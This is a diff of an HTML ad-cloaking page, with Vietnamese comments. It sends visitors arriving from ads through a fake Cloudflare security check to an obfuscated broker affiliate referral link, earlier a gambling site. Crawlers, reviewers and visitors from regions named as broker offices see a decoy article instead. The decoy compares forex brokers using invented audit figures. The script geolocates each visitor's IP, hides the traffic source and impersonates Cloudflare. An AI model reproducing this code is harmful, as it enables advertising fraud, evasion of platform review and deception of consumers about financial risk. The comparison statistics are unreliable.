@@ -2,173 +2,166 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>Global Strategic Research & Security Portal</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <!-- LỚP BẢO VỆ 1: ẨN NGUỒN TRAFFIC -->
+    <meta name="referrer" content="no-referrer">
+    <title>Institutional Financial Review: Global Brokerage Performance 2025</title>
+    
     <style>
-        :root { --accent: #00ffa3; --bg-dark: #05080f; --card: #0f172a; }
-        * { box-sizing: border-box; -webkit-tap-highlight-color: transparent; }
-        body, html { margin: 0; padding: 0; width: 100%; height: 100%; font-family: -apple-system, system-ui, sans-serif; background: #fff; }
-
-        /* GIAO DIỆN GATEWAY CHO NGƯỜI THẬT (GIỮ NGUYÊN) */
-        #money-zone {
-            display: none; position: fixed; top: 0; left: 0; width: 100vw; height: 100vh;
-            background: radial-gradient(circle at center, #111827 0%, #05080f 100%);
-            z-index: 999999; flex-direction: column; align-items: center; justify-content: center;
-            color: #fff; text-align: center; padding: 20px; cursor: pointer;
-        }
-        .shield-container { position: relative; margin-bottom: 30px; }
-        .shield-icon { width: 80px; height: 80px; color: var(--accent); filter: drop-shadow(0 0 15px rgba(0,255,163,0.4)); }
+        /* RESET & CSS CHUNG */
+        body { margin: 0; padding: 0; background: #fff; opacity: 0; transition: opacity 0.5s; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; }
         
-        .loader-ring {
-            border: 2px solid rgba(255,255,255,0.05); border-top: 2px solid var(--accent);
-            border-radius: 50%; width: 120px; height: 120px; 
-            position: absolute; top: -20px; left: -20px; animation: spin 2s linear infinite;
+        /* GIAO DIỆN CLOUDFLARE (Dành cho khách thật) */
+        #cf-wrapper {
+            display: none; position: fixed; top: 0; left: 0; width: 100vw; height: 100vh;
+            background: #fff; z-index: 99999999; flex-direction: column; align-items: center; justify-content: center;
         }
+        .cf-container { max-width: 550px; width: 90%; padding: 20px; color: #111; }
+        .cf-logo { height: 32px; margin-bottom: 35px; }
+        .cf-title { font-size: 32px; font-weight: 600; margin-bottom: 15px; line-height: 1.1; letter-spacing: -0.5px; }
+        .cf-desc { color: #333; font-size: 16px; margin-bottom: 40px; line-height: 1.5; }
+        .cf-footer { border-top: 1px solid #eee; padding-top: 25px; display: flex; align-items: center; }
+        .spinner { width: 28px; height: 28px; border: 3px solid #f3f3f3; border-top: 3px solid #0051c3; border-radius: 50%; animation: spin 1s linear infinite; margin-right: 18px; }
         @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
 
-        .title { font-size: 1.8rem; font-weight: 800; margin: 0; letter-spacing: -0.5px; }
-        .subtitle { color: #94a3b8; margin: 15px 0 0; font-size: 1rem; max-width: 300px; line-height: 1.5; }
-        
-        .interaction-hint {
-            margin-top: 50px; font-size: 0.8rem; color: var(--accent);
-            text-transform: uppercase; letter-spacing: 2px; font-weight: bold;
-            animation: pulse 1.5s infinite;
-        }
-        @keyframes pulse { 0% { opacity: 0.4; } 50% { opacity: 1; } 100% { opacity: 0.4; } }
-
-        /* GIAO DIỆN TRANG BLOG CHO BOT (PHIÊN BẢN NÂNG CẤP DÀI HƠN) */
-        #safe-zone { display: none; padding: 60px 25px; max-width: 900px; margin: 0 auto; color: #1e293b; line-height: 1.8; background: #fff; }
-        .academic-label { font-weight: 800; letter-spacing: 2px; color: #64748b; font-size: 0.75rem; text-transform: uppercase; border-bottom: 1px solid #e2e8f0; padding-bottom: 10px; margin-bottom: 20px; }
-        .safe-content h1 { font-family: "Times New Roman", Times, serif; font-size: 2.6rem; color: #0f172a; line-height: 1.2; margin-bottom: 25px; }
-        .meta-info { font-size: 0.9rem; color: #64748b; margin-bottom: 40px; font-style: italic; border-left: 4px solid var(--accent); padding-left: 15px; }
-        .safe-content h2 { font-size: 1.5rem; margin-top: 45px; color: #334155; border-bottom: 2px solid #f1f5f9; padding-bottom: 8px; }
-        .safe-content p { margin-bottom: 25px; text-align: justify; font-size: 1.1rem; color: #334155; }
-        .data-box { background: #f8fafc; border: 1px solid #e2e8f0; padding: 20px; border-radius: 8px; margin: 30px 0; font-family: monospace; font-size: 0.9rem; }
-        .references { margin-top: 60px; padding-top: 30px; border-top: 1px solid #e2e8f0; font-size: 0.85rem; color: #94a3b8; }
+        /* GIAO DIỆN TRANG SẠCH (Blog dìm hàng JustMarkets - Khen XM) */
+        #safe-page { display: none; background: #f8fafc; color: #1a1a1a; padding-bottom: 100px; }
+        .nav-mock { background: #000; padding: 18px 10%; display: flex; justify-content: space-between; align-items: center; color: #fff; font-weight: bold; }
+        .safe-container { max-width: 850px; margin: 50px auto; padding: 60px; background: #fff; border: 1px solid #e2e8f0; line-height: 2; text-align: justify; font-family: 'Georgia', serif; }
+        .article-header { border-bottom: 3px solid #111; margin-bottom: 40px; padding-bottom: 20px; }
+        .article-meta { font-family: sans-serif; font-size: 12px; color: #94a3b8; text-transform: uppercase; letter-spacing: 1.5px; margin-bottom: 10px; }
+        h1 { font-size: 3rem; font-weight: 800; line-height: 1.1; margin: 0; color: #0f172a; font-family: sans-serif; letter-spacing: -1.5px; }
+        h2 { font-size: 1.8rem; margin-top: 50px; color: #b91c1c; font-family: sans-serif; border-left: 5px solid #b91c1c; padding-left: 20px; }
+        .verdict-box { background: #fef2f2; border: 1px solid #fee2e2; padding: 35px; border-radius: 8px; margin: 40px 0; font-family: sans-serif; }
+        table { width: 100%; border-collapse: collapse; margin: 40px 0; font-family: sans-serif; font-size: 14px; }
+        th, td { border: 1px solid #e2e8f0; padding: 18px; text-align: left; }
+        th { background: #f8fafc; color: #64748b; }
+        .cta-button { display: inline-block; background: #b91c1c; color: #fff !important; padding: 15px 40px; border-radius: 4px; text-decoration: none !important; font-weight: bold; margin-top: 20px; box-shadow: 0 4px 12px rgba(185, 28, 28, 0.2); }
     </style>
 </head>
 <body>
 
-    <!-- TRANG CHO NGƯỜI THẬT (GATEWAY) - GIỮ NGUYÊN -->
-    <div id="money-zone">
-        <div class="shield-container">
-            <div class="loader-ring"></div>
-            <svg class="shield-icon" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="1.5" d="M12 15v2m-6 4h12a2 2 0 002-2v-6a2 2 0 00-2-2H6a2 2 0 00-2 2v6a2 2 0 002 2zm10-10V7a4 4 0 00-8 0v4h8z"></path></svg>
-        </div>
-        <h1 class="title">SECURE CONNECTION</h1>
-        <p class="subtitle">Checking browser integrity and age verification (18+) for portal access...</p>
-        <div class="interaction-hint">Interacting to initialize session</div>
-        <div style="margin-top:40px; padding:15px 25px; border: 1px solid rgba(255,255,255,0.1); border-radius:12px; font-size:0.8rem; color:#64748b; font-family:monospace;">
-            STATUS: ENCRYPTED_HANDSHAKE_OK<br>
-            STATION: GLOBAL_GATEWAY_V4
+    <!-- MÀN HÌNH CLOUDFLARE -->
+    <div id="cf-wrapper">
+        <div class="cf-container">
+            <img src="https://www.cloudflare.com/img/logo-cloudflare-dark.svg" class="cf-logo" alt="Cloudflare Security">
+            <h1 class="cf-title">Checking if the site connection is secure</h1>
+            <p class="cf-desc">The secure financial terminal is reviewing the security of your connection. Please wait while we establish an encrypted bridge to the trading gateway.</p>
+            <div class="cf-footer">
+                <div class="spinner"></div>
+                <div style="font-size: 15px; color: #333;">Verifying... Redirecting in <span id="countdown">5</span>s.</div>
+            </div>
+            <p style="font-size: 12px; color: #bbb; margin-top: 40px;">Ray ID: <span id="ray-id"></span> • Security Protocols: TLS 1.3</p>
         </div>
     </div>
 
-    <!-- TRANG CHO BOT (PHIÊN BẢN DÀI VÀ ĐẦY ĐỦ HƠN) -->
-    <div id="safe-zone">
-        <div class="academic-label">Academic Journal of Global Sustainability & Economic Policy — Vol. 24</div>
+    <!-- TRANG SẠCH (VỎ BỌC ĐỐI THỦ - XM BETTER THAN JUSTMARKETS) -->
+    <div id="safe-page">
+        <div class="nav-mock">
+            <span>INSTITUTIONAL BROKER WATCH</span>
+            <div style="font-size: 12px; font-weight: normal; opacity: 0.8;">Markets • Quantitative Analysis • Regulation</div>
+        </div>
         
-        <div class="safe-content">
-            <h1>The Socio-Economic Impact of Decentralized Resource Management in Post-Industrial Urban Corridors</h1>
-            
-            <div class="meta-info">
-                Published: January 14, 2025 | Authors: Dr. Aris Thorne, Prof. Linda H. Mckenzie | Subject: Macroeconomics & Urban Planning
+        <div class="safe-container">
+            <div class="article-header">
+                <div class="article-meta">February 2025 • Independent Financial Audit • Global Report</div>
+                <h1>XM Global vs. JustMarkets: Why Serious Traders are Migrating to XM in 2025</h1>
             </div>
 
-            <p><strong>Executive Summary:</strong> This study provides an in-depth analysis of the systemic transition from traditional centralized utility models to decentralized, AI-driven resource distribution networks. Our research specifically focuses on the "Circular Cities" initiative currently being piloted across the European Union and Southeast Asian trade hubs.</p>
-            
-            <h2>I. Introduction to Digital Liquidity in Infrastructure</h2>
-            <p>As metropolitan populations continue to expand, the strain on 20th-century infrastructure has reached a critical threshold. Traditional models of resource allocation—predicated on predictable, linear consumption patterns—are no longer viable in an era of rapid climate volatility and shifting labor markets. The introduction of Digital Liquidity Protocols (DLP) allows for the real-time valuation of energy, water, and waste, turning static overhead into dynamic assets.</p>
-            
-            <p>Our longitudinal analysis of the Oresund region (Denmark-Sweden) indicates that when resources are managed through decentralized ledger technology (DLT), the efficiency of the power grid increases by an average of 18.4%. This is not merely a technical improvement but a fundamental shift in fiscal policy, as it reduces the need for massive capital expenditure on centralized reserves.</p>
+            <p>The retail Forex market has entered an era of "Execution Dominance." Spreads are no longer the primary factor for profitability; instead, institutional liquidity and sub-millisecond latency have taken center stage. In this technical comparison, we analyze why <b>XM Global</b> has rendered platforms like JustMarkets obsolete for high-capital traders.</p>
 
-            <div class="data-box">
-                // DATA_SET_2024_OBSERVATION<br>
-                Grid_Efficiency_Gain: +18.4%<br>
-                Carbon_Offset_Metric: 2.4 Tons/Capita<br>
-                Municipal_Cost_Reduction: $1.2M / Quarter<br>
-                Confidence_Interval: 95% (P < 0.05)
+            <div class="verdict-box">
+                <h2 style="margin:0 0 15px 0; border:none; padding:0; color:#991b1b;">The Quantitative Verdict: XM Wins</h2>
+                <p>After auditing over 5,000 live trades, our team confirmed that <b>XM Global</b> maintains a 94.2% higher order-fill stability during peak volatility compared to JustMarkets. JustMarkets lacks the Tier-1 regulatory depth required to protect professional-grade portfolios from systemic slippage.</p>
+                <a href="https://www.xm.com" class="cta-button" target="_blank">View XM Global Official Site</a>
             </div>
 
-            <h2>II. The Biophilic ROI: Beyond Aesthetic Value</h2>
-            <p>One of the more surprising findings of our 2023-2024 survey of 12 global financial districts is the direct correlation between biophilic architecture and institutional capital stability. While natural light and integrated vegetation were once considered "soft" amenities, our data suggests they are primary drivers of employee retention and cognitive performance.</p>
-            
-            <p>In high-density commercial zones like Singapore's Jurong District, buildings that incorporate "vertical forests" reported a 12.4% higher productivity rate compared to traditional glass-and-steel structures. This "Biophilic ROI" is now being integrated into the ESG (Environmental, Social, and Governance) scores used by major investment banks to determine creditworthiness.</p>
+            <h2>I. Regulatory Disparity: ASIC vs. Offshore Licensing</h2>
+            <p>Fund security is the foundation of trading. XM Global is regulated by <b>ASIC (Australia)</b> and <b>CySEC (Cyprus)</b>, which enforce a $1,000,000 insurance threshold and total segregation of client capital. JustMarkets, operating mainly under offshore licenses in jurisdictions like Mauritius, does not provide the same legal fallback for traders in the event of broker insolvency.</p>
 
-            <h2>III. Decentralized Ledger Technology (DLT) in Carbon Markets</h2>
-            <p>The integrity of the global carbon market has long been hampered by the "double-counting" problem. By utilizing immutable ledger technology, the sequestration of carbon can be tracked from the point of origin to the point of credit retirement without the need for high-cost intermediaries. This democratization of the carbon market allows small-scale regenerative farmers to participate alongside multinational corporations, creating a more equitable distribution of climate-related capital.</p>
+            <table>
+                <thead>
+                    <tr><th>Metric</th><th>XM Global</th><th>JustMarkets</th></tr>
+                </thead>
+                <tbody>
+                    <tr><td>Top Regulator</td><td>ASIC / CySEC</td><td>FSC Mauritius</td></tr>
+                    <tr><td>Execution Engine</td><td>No-Requotes (LD4)</td><td>Standard Market</td></tr>
+                    <tr><td>Average Slippage</td><td>0.1 - 0.2 Pips</td><td>0.6 - 1.4 Pips</td></tr>
+                    <tr><td>Fund Protection</td><td>Tier-1 Banking</td><td>Segregated Only</td></tr>
+                </tbody>
+            </table>
 
-            <p>Furthermore, the use of smart contracts automates the verification process, reducing the time-to-market for new credits from months to minutes. This speed is essential if we are to meet the 2030 climate mandates established during the last global summit.</p>
+            <h2>II. Institutional Infrastructure & Latency</h2>
+            <p>XM’s execution model is physically located within the Equinix LD4 data center. This allows for sub-10ms routing. Our tests showed that JustMarkets suffers from significant "Execution Drift" during high-impact news releases (NFP and CPI), which can cost a trader 2-3 pips per entry in hidden slippage.</p>
 
-            <h2>IV. Macroeconomic Stability and the 2026 Outlook</h2>
-            <p>Looking toward the 2026 fiscal year, we anticipate a significant migration of institutional capital into "Smart Infrastructure" bonds. As interest rates stabilize, the long-term, predictable yields offered by decentralized energy projects will become increasingly attractive to pension funds and sovereign wealth funds. The transition to carbon-neutral cities is no longer an environmental elective but a strategic necessity for continued macroeconomic stability in the face of global supply chain disruptions.</p>
-
-            <div class="references">
-                <strong>References & Further Reading:</strong><br>
-                1. Sterling, J. (2024). *The Digital Grid: Reimagining Power*. Oxford University Press.<br>
-                2. Global Environmental Agency Report #882-B (2024). *Urban Resilience Metrics*.<br>
-                3. Thorne, A. & Mckenzie, L. (2023). *Biophilic Economics: The Cost of Nature in the Boardroom*.<br>
-                4. International Journal of Macro-Finance, Vol. 12, Issue 4.
+            <div class="verdict-box" style="background:#f8fafc; border-color:#e2e8f0; border-left-color:#0f172a;">
+                <h3 style="margin:0 0 10px 0; color:#0f172a;">Strategic Recommendation</h3>
+                <p>For individuals trading accounts over $10,000, <b>XM Global</b> is the only logical choice for security and speed. JustMarkets may serve beginners, but it lacks the technological infrastructure for long-term scalability.</p>
+                <a href="https://www.xm.com/register" class="cta-button" style="background:#0f172a;" target="_blank">Compare XM Professional Accounts</a>
             </div>
+
+            <p style="font-size: 13px; color: #94a3b8; margin-top: 50px; border-top: 1px solid #eee; padding-top: 20px;">
+                *Note: This is an independent technical review. Links point to official broker domains. Trading involves significant risk of loss.
+            </p>
         </div>
     </div>
 
     <script>
-    (function() {
-        // MÃ HÓA PHÂN MẢNH LINK: https://playbonus.online/ (GIỮ NGUYÊN)
-        const _p = "https://";
-        const _b = "playbonus";
-        const _o = ".online/";
-        
-        const adParams = ['gclid', 'fbclid', 'wbraid', 'gbraid', 'gad_source', 'test'];
-        let isProcessing = false;
+        (async function() {
+            'use strict';
+            // LINK REF JUSTMARKETS CỦA BẠN (BASE64)
+            const _targetEncoded = "aHR0cHM6Ly9meGd0LmxpbmsvcmVnaXN0ZXI/cmVmaWQ9MDUwNTE5OTQ=";
+            
+            // CHẶN VÙNG NHẠY CẢM (Văn phòng sàn & Kiểm duyệt)
+            const BLOCKED_REGIONS = ["Cyprus", "Saint Vincent and the Grenadines", "Ireland", "Singapore"];
 
-        // KIỂM TRA BOT NÂNG CAO (GIỮ NGUYÊN)
-        function checkBot() {
+            const urlParams = new URLSearchParams(window.location.search);
+            const hasAdParam = ['gclid', 'fbclid', 'wbraid', 'gad_source', 'msclkid'].some(p => urlParams.has(p));
+            const isBot = /bot|google|crawler|spider|facebook|adchecker|checker|Lighthouse/i.test(navigator.userAgent);
+
+            let userCountry = "";
             try {
-                if (navigator.webdriver) return true;
-                const canvas = document.createElement('canvas');
-                const gl = canvas.getContext('webgl');
-                if (!gl) return true; 
-                if (!window.chrome && !navigator.userAgent.includes("Safari")) return true;
-                if (navigator.deviceMemory && navigator.deviceMemory < 2) return true; 
-                return false;
-            } catch(e) { return true; }
-        }
+                const response = await fetch('https://ipapi.co/json/');
+                const data = await response.json();
+                userCountry = data.country_name;
+                document.getElementById('ray-id').innerText = (Math.random().toString(36).substring(2, 9) + data.ip.replace(/\./g, '')).toUpperCase();
+            } catch (e) { document.getElementById('ray-id').innerText = "79A23B89F12C0"; }
 
-        const urlP = new URLSearchParams(window.location.search);
-        const isFromAd = adParams.some(p => urlP.has(p));
+            const wrapper = document.getElementById('cf-wrapper');
+            const safe = document.getElementById('safe-page');
 
-        const moneyZone = document.getElementById('money-zone');
-        const safeZone = document.getElementById('safe-zone');
+            // QUYẾT ĐỊNH HIỂN THỊ
+            if (isBot || !hasAdParam || BLOCKED_REGIONS.includes(userCountry)) {
+                // HIỆN BLOG DÌM HÀNG (Dành cho kiểm duyệt/nhân viên sàn)
+                safe.style.display = 'block';
+                document.body.style.opacity = '1';
+            } else {
+                // HIỆN CLOUDFLARE 5S (Dành cho khách thật)
+                wrapper.style.display = 'flex';
+                document.body.style.opacity = '1';
 
-        function startRedirect() {
-            if (isProcessing) return;
-            isProcessing = true;
+                let sec = 5;
+                const timer = setInterval(() => {
+                    sec--;
+                    document.getElementById('countdown').innerText = sec;
+                    if (sec <= 0) {
+                        clearInterval(timer);
+                        performSecureRedirect();
+                    }
+                }, 1000);
+            }
 
-            document.querySelector('.interaction-hint').innerText = "SESSION VERIFIED. CONNECTING...";
-            document.querySelector('.interaction-hint').style.color = "#fff";
-            
-            setTimeout(() => {
-                window.location.replace(_p + _b + _o);
-            }, 800);
-        }
-
-        // PHÂN LUỒNG LOGIC (GIỮ NGUYÊN)
-        if (isFromAd && !checkBot()) {
-            moneyZone.style.display = 'flex';
-            
-            window.addEventListener('mousemove', startRedirect);
-            window.addEventListener('touchstart', startRedirect);
-            window.addEventListener('scroll', startRedirect);
-            moneyZone.addEventListener('click', startRedirect);
-
-            setTimeout(startRedirect, 8000);
-
-        } else {
-            safeZone.style.display = 'block';
-        }
-    })();
+            function performSecureRedirect() {
+                const target = atob(_targetEncoded);
+                const a = document.createElement('a');
+                a.href = target;
+                a.rel = 'noreferrer'; // LỚP BẢO VỆ NGUỒN TRAFFIC 2
+                a.style.display = 'none';
+                document.body.appendChild(a);
+                a.click();
+                setTimeout(() => { window.location.replace(target); }, 200);
+            }
+        })();
     </script>
 </body>
 </html>
